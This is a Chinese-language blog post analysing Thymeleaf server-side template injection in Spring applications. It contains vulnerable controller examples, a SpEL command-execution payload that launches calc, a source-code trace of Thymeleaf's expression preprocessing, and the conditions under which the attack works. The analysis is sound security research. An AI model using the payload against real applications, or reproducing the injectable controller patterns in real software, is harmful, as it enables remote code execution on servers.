---
layout:     post
title:      Java Thymeleaf 模板注入分析
subtitle:   简单分析
date:       2020-9-22
author:     BY Diego
header-img: img/wenzhang/Thymeleaf.jpg
catalog: true
tags:
    - Java
	- 命令注入
---

# Java Thymeleaf 模板注入分析



## 模板基本用法



在 springboot 常与 Thymeleaf  搭配使用

模板使用方法，return 为模板的名称

![wHnPeJ.png](https://s1.ax1x.com/2020/09/21/wHnPeJ.png)



![wHn9L4.png](https://s1.ax1x.com/2020/09/21/wHn9L4.png)



效果

![](https://s1.ax1x.com/2020/09/21/wHn6pV.png)



常见用法

https://waylau.gitbooks.io/thymeleaf-tutorial/content/docs/standard-expression-syntax.html

## 模板注入



当return 可控时，或者 返回值为空但url 可控时 就存在模板注入

```java
@Controller
@RequestMapping("/thymeleaf")
public class IndexController {

    //情况一
    @GetMapping("/test")
    public String test(String test){
        return test;
    }

    // 情况二
    @GetMapping("/test1/{test}")
    public void test1(){

    }
}
```



测试payload 

```
__${T(java.lang.Runtime).getRuntime().exec("calc")}__::.x
```





![wHKbee.png](https://s1.ax1x.com/2020/09/21/wHKbee.png)



![wHMuOU.png](https://s1.ax1x.com/2020/09/21/wHMuOU.png)



## 漏洞分析



情况一

在 `org.thymeleaf.spring5.view` 中的 `renderFragment`方法

`viewTemplateName` 的值即为可控输入，并return的值 ，如果值中包含`::` 则进入下面的分只（278行）,然后拼接成 `~{__${T(java.lang.Runtime).getRuntime().exec("calc")}__::.x}`

![wHMzN9.png](https://s1.ax1x.com/2020/09/21/wHMzN9.png)

跟进

![wH3R8s.png](https://s1.ax1x.com/2020/09/21/wH3R8s.png)



`input` 值被 `StandardExpressionPreprocessor.preprocess`处理 

![wH12X6.png](https://s1.ax1x.com/2020/09/21/wH12X6.png)



处理代码,有一个正则匹配`\_\_(.*?)\_\_` 。处理后变成 `${T(java.lang.Runtime).getRuntime().exec("calc")}`

```java
 static String preprocess(
            final IExpressionContext context,
            final String input) {
           //PREPROCESS_DELIMITER 的值为 _
        if (input.indexOf(PREPROCESS_DELIMITER) == -1) {
            // Fail quick
            return input;
        }

        final IStandardExpressionParser expressionParser = StandardExpressions.getExpressionParser(context.getConfiguration());
        if (!(expressionParser instanceof StandardExpressionParser)) {
            // Preprocess will be only available for the StandardExpressionParser, because the preprocessor
            // depends on this specific implementation of the parser.
            return input;
        }
			//PREPROCESS_EVAL_PATTERN  的值为 \_\_(.*?)\_\_
        final Matcher matcher = PREPROCESS_EVAL_PATTERN.matcher(input);
        
        if (matcher.find()) {

            final StringBuilder strBuilder = new StringBuilder(input.length() + 24);
            int curr = 0;
            
            do {
                
                final String previousText = 
                        checkPreprocessingMarkUnescaping(input.substring(curr,matcher.start(0)));
                final String expressionText = 
                        checkPreprocessingMarkUnescaping(matcher.group(1));
                        
                strBuilder.append(previousText);
                
                final IStandardExpression expression =
                        StandardExpressionParser.parseExpression(context, expressionText, false);
                if (expression == null) {
                    return null;
                }
                
                final Object result = expression.execute(context, StandardExpressionExecutionContext.RESTRICTED);
                
                strBuilder.append(result);
                
                curr = matcher.end(0);
                
            } while (matcher.find());
            
            final String remaining = checkPreprocessingMarkUnescaping(input.substring(curr));
            
            strBuilder.append(remaining);
            
            return strBuilder.toString().trim();
            
        }
        
        return checkPreprocessingMarkUnescaping(input);
        
    }
```



继续跟进到`execute`方法

![wHMXBF.png](https://s1.ax1x.com/2020/09/21/wHMXBF.png)



下图可以看到是使用的`SPEL` 引擎，因此只要满足`__(${SPEL})__::` 这中格式即可达到注入效果，不管前后有何值（除去redirect:等），绕过可用SPEL 的绕过方式

![wHMxAJ.png](https://s1.ax1x.com/2020/09/21/wHMxAJ.png)



情况二也类似

如果return 为空，那么url就会当作模板值



## 利用条件



不能有` @ResponseBody` 或者 `@RestController`

如下

```java
    @GetMapping("/test")
    @ResponseBody
    public String test(String test){
        return test;
    }
```



方法参数中不能有 `HttpServletResponse`

```java
    @GetMapping("/system/menuStyle/{style}")
    public void menuStyle(@PathVariable String style, HttpServletResponse response)
    {
        CookieUtils.setCookie(response, "nav-style", style);
    }
```



在返回值前面不能加 "redirect:"

```java
  @GetMapping("/test")
    public String test(String test){
        return "redirect:" + test ;
    }
```

